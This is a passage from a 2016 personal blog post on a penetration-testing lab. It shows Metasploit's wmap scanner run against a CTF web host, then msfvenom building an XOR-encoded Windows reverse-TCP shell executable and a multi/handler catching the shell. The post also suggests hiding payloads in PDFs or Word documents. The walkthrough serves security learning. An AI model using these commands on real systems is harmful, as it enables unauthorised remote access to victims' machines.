</span><span class='line'>msf &gt; help
</span><span class='line'>
</span><span class='line'>wmap Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    wmap_modules  Manage wmap modules
</span><span class='line'>    wmap_nodes    Manage nodes
</span><span class='line'>    wmap_run      Test targets
</span><span class='line'>    wmap_sites    Manage sites
</span><span class='line'>    wmap_targets  Manage targets
</span><span class='line'>    wmap_vulns    Display web vulns
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>First you have to add a site:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_sites -h
</span><span class='line'>[*] Usage: wmap_sites [options]
</span><span class='line'>  -h        Display this help text
</span><span class='line'>  -a [url]  Add site (vhost,url)
</span><span class='line'>  -d [ids]  Delete sites (separate ids with space)
</span><span class='line'>  -l        List all available sites
</span><span class='line'>  -s [id]   Display site structure (vhost,url|ids) (level)
</span><span class='line'>msf &gt; wmap_sites -a http://192.168.80.157/
</span><span class='line'>[*] Site created.
</span></code></pre></td></tr></table></div></figure>


<p>Then you specify the added site as a target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_targets -h
</span><span class='line'>[*] Usage: wmap_targets [options]
</span><span class='line'>  -h      Display this help text
</span><span class='line'>  -t [urls]   Define target sites (vhost1,url[space]vhost2,url) 
</span><span class='line'>  -d [ids]    Define target sites (id1, id2, id3 ...)
</span><span class='line'>  -c      Clean target sites list
</span><span class='line'>  -l          List all target sites
</span><span class='line'>msf &gt; wmap_targets -t http://192.168.80.157/</span></code></pre></td></tr></table></div></figure>


<p>Before scanning you might want to take a look at the enabled modules:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_modules -h
</span><span class='line'>[*] Usage: wmap_modules [options]
</span><span class='line'>  -h      Display this help text
</span><span class='line'>  -l          List all wmap enabled modules
</span><span class='line'>  -r      Reload wmap modules
</span><span class='line'>
</span><span class='line'>msf &gt; wmap_modules -l
</span><span class='line'>[*] Loading wmap modules...
</span><span class='line'>[*] 40 wmap enabled modules loaded.
</span><span class='line'>[*] wmap_ssl
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>     Name                         OrderID
</span><span class='line'>     ----                         -------
</span><span class='line'>     auxiliary/scanner/http/cert  :last
</span><span class='line'>     auxiliary/scanner/http/ssl   :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_server
</span><span class='line'>===========
</span><span class='line'>
</span><span class='line'>     Name                                           OrderID
</span><span class='line'>     ----                                           -------
</span><span class='line'>     auxiliary/admin/http/tomcat_administration     :last
</span><span class='line'>     auxiliary/admin/http/tomcat_utf8_traversal     :last
</span><span class='line'>     auxiliary/scanner/http/drupal_views_user_enum  :last
</span><span class='line'>     auxiliary/scanner/http/frontpage_login         :last
</span><span class='line'>     auxiliary/scanner/http/host_header_injection   :last
</span><span class='line'>     auxiliary/scanner/http/http_version            0
</span><span class='line'>     auxiliary/scanner/http/open_proxy              1
</span><span class='line'>     auxiliary/scanner/http/options                 :last
</span><span class='line'>     auxiliary/scanner/http/robots_txt              :last
</span><span class='line'>     auxiliary/scanner/http/scraper                 :last
</span><span class='line'>     auxiliary/scanner/http/svn_scanner             :last
</span><span class='line'>     auxiliary/scanner/http/trace                   :last
</span><span class='line'>     auxiliary/scanner/http/vhost_scanner           :last
</span><span class='line'>     auxiliary/scanner/http/webdav_internal_ip      :last
</span><span class='line'>     auxiliary/scanner/http/webdav_scanner          :last
</span><span class='line'>     auxiliary/scanner/http/webdav_website_content  :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_dir
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>     Name                                                   OrderID
</span><span class='line'>     ----                                                   -------
</span><span class='line'>     auxiliary/scanner/http/brute_dirs                      :last
</span><span class='line'>     auxiliary/scanner/http/dir_listing                     :last
</span><span class='line'>     auxiliary/scanner/http/dir_scanner                     :last
</span><span class='line'>     auxiliary/scanner/http/dir_webdav_unicode_bypass       :last
</span><span class='line'>     auxiliary/scanner/http/file_same_name_dir              :last
</span><span class='line'>     auxiliary/scanner/http/files_dir                       :last
</span><span class='line'>     auxiliary/scanner/http/http_put                        :last
</span><span class='line'>     auxiliary/scanner/http/ms09_020_webdav_unicode_bypass  :last
</span><span class='line'>     auxiliary/scanner/http/prev_dir_same_name_file         :last
</span><span class='line'>     auxiliary/scanner/http/soap_xml                        :last
</span><span class='line'>     auxiliary/scanner/http/trace_axd                       :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_file
</span><span class='line'>=========
</span><span class='line'>
</span><span class='line'>     Name                                     OrderID
</span><span class='line'>     ----                                     -------
</span><span class='line'>     auxiliary/dos/http/apache_range_dos      :last
</span><span class='line'>     auxiliary/scanner/http/backup_file       :last
</span><span class='line'>     auxiliary/scanner/http/copy_of_file      :last
</span><span class='line'>     auxiliary/scanner/http/replace_ext       :last
</span><span class='line'>     auxiliary/scanner/http/verb_auth_bypass  :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_unique_query
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>     Name                                          OrderID
</span><span class='line'>     ----                                          -------
</span><span class='line'>     auxiliary/scanner/http/blind_sql_query        :last
</span><span class='line'>     auxiliary/scanner/http/error_sql_injection    :last
</span><span class='line'>     auxiliary/scanner/http/http_traversal         :last
</span><span class='line'>     auxiliary/scanner/http/rails_mass_assignment  :last
</span><span class='line'>     exploit/multi/http/lcms_php_exec              :last
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_query
</span><span class='line'>==========
</span><span class='line'>
</span><span class='line'>     Name  OrderID
</span><span class='line'>     ----  -------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] wmap_generic
</span><span class='line'>============
</span><span class='line'>
</span><span class='line'>     Name  OrderID
</span><span class='line'>     ----  -------</span></code></pre></td></tr></table></div></figure>


<p>And finally, you can see which modules are enabled for your target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_run -h
</span><span class='line'>[*] Usage: wmap_run [options]
</span><span class='line'>  -h                        Display this help text
</span><span class='line'>  -t                        Show all enabled modules
</span><span class='line'>  -m [regex]                Launch only modules that name match provided regex.
</span><span class='line'>  -p [regex]                Only test path defined by regex.
</span><span class='line'>  -e [/path/to/profile]     Launch profile modules against all matched targets.
</span><span class='line'>                            (No profile file runs all enabled modules.)
</span><span class='line'>msf &gt; wmap_run -t
</span><span class='line'>[*] Testing target:
</span><span class='line'>[*]   Site: 192.168.80.157 (192.168.80.157)
</span><span class='line'>[*]   Port: 80 SSL: false
</span><span class='line'>============================================================
</span><span class='line'>[*] Testing started. 2016-06-07 13:37:11 -0400
</span><span class='line'>[*] 
</span><span class='line'>=[ SSL testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Target is not SSL. SSL modules disabled.
</span><span class='line'>[*] 
</span><span class='line'>=[ Web Server testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/scanner/http/http_version
</span><span class='line'>[*] Module auxiliary/scanner/http/open_proxy
</span><span class='line'>[*] Module auxiliary/scanner/http/robots_txt
</span><span class='line'>[*] Module auxiliary/scanner/http/frontpage_login
</span><span class='line'>[*] Module auxiliary/scanner/http/host_header_injection
</span><span class='line'>[*] Module auxiliary/admin/http/tomcat_administration
</span><span class='line'>[*] Module auxiliary/admin/http/tomcat_utf8_traversal
</span><span class='line'>[*] Module auxiliary/scanner/http/options
</span><span class='line'>[*] Module auxiliary/scanner/http/drupal_views_user_enum
</span><span class='line'>[*] Module auxiliary/scanner/http/scraper
</span><span class='line'>[*] Module auxiliary/scanner/http/svn_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/trace
</span><span class='line'>[*] Module auxiliary/scanner/http/vhost_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_internal_ip
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/webdav_website_content
</span><span class='line'>[*] 
</span><span class='line'>=[ File/Dir testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/dos/http/apache_range_dos
</span><span class='line'>[*] Module auxiliary/scanner/http/backup_file
</span><span class='line'>[*] Module auxiliary/scanner/http/brute_dirs
</span><span class='line'>[*] Module auxiliary/scanner/http/copy_of_file
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_listing
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_scanner
</span><span class='line'>[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
</span><span class='line'>[*] Module auxiliary/scanner/http/file_same_name_dir
</span><span class='line'>[*] Module auxiliary/scanner/http/files_dir
</span><span class='line'>[*] Module auxiliary/scanner/http/http_put
</span><span class='line'>[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
</span><span class='line'>[*] Module auxiliary/scanner/http/prev_dir_same_name_file
</span><span class='line'>[*] Module auxiliary/scanner/http/replace_ext
</span><span class='line'>[*] Module auxiliary/scanner/http/soap_xml
</span><span class='line'>[*] Module auxiliary/scanner/http/trace_axd
</span><span class='line'>[*] Module auxiliary/scanner/http/verb_auth_bypass
</span><span class='line'>[*] 
</span><span class='line'>=[ Unique Query testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Module auxiliary/scanner/http/blind_sql_query
</span><span class='line'>[*] Module auxiliary/scanner/http/error_sql_injection
</span><span class='line'>[*] Module auxiliary/scanner/http/http_traversal
</span><span class='line'>[*] Module auxiliary/scanner/http/rails_mass_assignment
</span><span class='line'>[*] Module exploit/multi/http/lcms_php_exec
</span><span class='line'>[*] 
</span><span class='line'>=[ Query testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] 
</span><span class='line'>=[ General testing ]=
</span><span class='line'>============================================================
</span><span class='line'>[*] Done.</span></code></pre></td></tr></table></div></figure>


<p>I started the scan with <code>wmap_run -e</code> (not showing the output due to size). After it finished, I checked if any interesting vulnerabilities were uncovered:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_vulns -l
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): scraper /
</span><span class='line'>[*]   scraper Scraper
</span><span class='line'>[*]   GET CTF 6 - Widgets Inc.
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /docs/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /js/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /lib/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 200
</span><span class='line'>[*] + [192.168.80.157] (192.168.80.157): directory /logs/
</span><span class='line'>[*]   directory Directoy found.
</span><span class='line'>[*]   GET Res code: 401
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Only a bunch of directories discovered but you don&rsquo;t know what you can find without looking.</p>

<h1>Generating executables</h1>

<p>With Msfvenom, you can not only generate shellcode, but also create executables from whichever payload you want to use.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom -h
</span><span class='line'>Options:
</span><span class='line'>    -p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
</span><span class='line'>        --payload-options            List the payload's standard options
</span><span class='line'>    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
</span><span class='line'>    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
</span><span class='line'>    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
</span><span class='line'>        --help-formats               List available formats
</span><span class='line'>    -e, --encoder       &lt;encoder&gt;    The encoder to use
</span><span class='line'>    -a, --arch          &lt;arch&gt;       The architecture to use
</span><span class='line'>        --platform      &lt;platform&gt;   The platform of the payload
</span><span class='line'>        --help-platforms             List available platforms
</span><span class='line'>    -s, --space         &lt;length&gt;     The maximum size of the resulting payload
</span><span class='line'>        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
</span><span class='line'>    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
</span><span class='line'>    -i, --iterations    &lt;count&gt;      The number of times to encode the payload
</span><span class='line'>    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
</span><span class='line'>    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
</span><span class='line'>    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
</span><span class='line'>    -o, --out           &lt;path&gt;       Save the payload
</span><span class='line'>    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
</span><span class='line'>        --smallest                   Generate the smallest possible payload
</span><span class='line'>    -h, --help                       Show this message</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s say we want to use a reverse shell executable. First, let&rsquo;s look at the payload options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom --payload-options -p windows/x64/shell/reverse_tcp
</span><span class='line'>Ignoring bcrypt-3.1.10 because its extensions are not built.  Try: gem pristine bcrypt --version 3.1.10
</span><span class='line'>Options for payload/windows/x64/shell/reverse_tcp:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       Name: Windows x64 Command Shell, Windows x64 Reverse TCP Stager
</span><span class='line'>     Module: payload/windows/x64/shell/reverse_tcp
</span><span class='line'>   Platform: Windows
</span><span class='line'>       Arch: x86_64
</span><span class='line'>Needs Admin: No
</span><span class='line'> Total size: 449
</span><span class='line'>       Rank: Normal
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>    sf &lt;stephen_fewer@harmonysecurity.com&gt;
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>Name      Current Setting  Required  Description
</span><span class='line'>----      ---------------  --------  -----------
</span><span class='line'>EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  Spawn a piped command shell (Windows x64) (staged). Connect back to 
</span><span class='line'>  the attacker (Windows x64)
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Now we know what options we need for creating an executable. I already have the LHOST and LPORT set, but will pass them anyway for demo purposes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.80.155 LPORT=4444 -b "\x00" -e x64/xor -f exe -o ~/doom.exe
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86_64 from the payload
</span><span class='line'>Found 1 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x64/xor
</span><span class='line'>x64/xor succeeded with size 551 (iteration=0)
</span><span class='line'>x64/xor chosen with final size 551
</span><span class='line'>Payload size: 551 bytes
</span><span class='line'>Saved as: /root/doom.exe</span></code></pre></td></tr></table></div></figure>


<p>Inside Metasploit, we have to launch the generic payload handler. <a href="https://www.rapid7.com/db/modules/exploit/multi/handler">This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.</a>. Don&rsquo;t forget to set the options and the payload to match the one you put in the executable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/handler
</span><span class='line'>msf exploit(handler) &gt; set payload windows/x64/shell/reverse_tcp
</span><span class='line'>payload =&gt; windows/x64/shell/reverse_tcp
</span><span class='line'>msf exploit(handler) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/handler):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/x64/shell/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Wildcard Target</span></code></pre></td></tr></table></div></figure>


<p>Now run the exploit on your machine. All you need to do now is to transfer your executable to the victim machine and run it there to receive your shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; run 
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4444 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Sending stage (336 bytes) to 192.168.80.128
</span><span class='line'>[*] Command shell session 1 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49196) at 2016-06-08 11:19:16 -0400
</span><span class='line'>
</span><span class='line'>Microsoft Windows [Version 6.1.7601]
</span><span class='line'>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
</span><span class='line'>
</span><span class='line'>C:\Users\wingoat\Desktop&gt;</span></code></pre></td></tr></table></div></figure>


<p>Success! This demo was pretty straightforward, but if executables attract too much attention on the target, you can try to sneak your payload into PDFs or Word documents instead.</p>

<h5>Conclusion</h5>

<p>This was a long post, but I wanted to showcase many of Metasploit&rsquo;s capabilities. It was a fun lab, but I barely scratched the surface of what&rsquo;s possible.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Don't hate yourself in the morning -- \
</span><span class='line'>\ sleep till noon.                      /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2016-06-11T13:57:36-04:00" pubdate data-updated="true">Jun 11<span>th</span>, 2016</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/tools/'>tools</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/" title="Previous Post: Pentest lab - LAMPSecurity CTF5">&laquo; Pentest lab - LAMPSecurity CTF5</a>
      
      
        <a class="basic-alignment right" href="/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/" title="Next Post: Pentest lab - Drunk Admin Web Hacking Challenge">Pentest lab - Drunk Admin Web Hacking Challenge &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
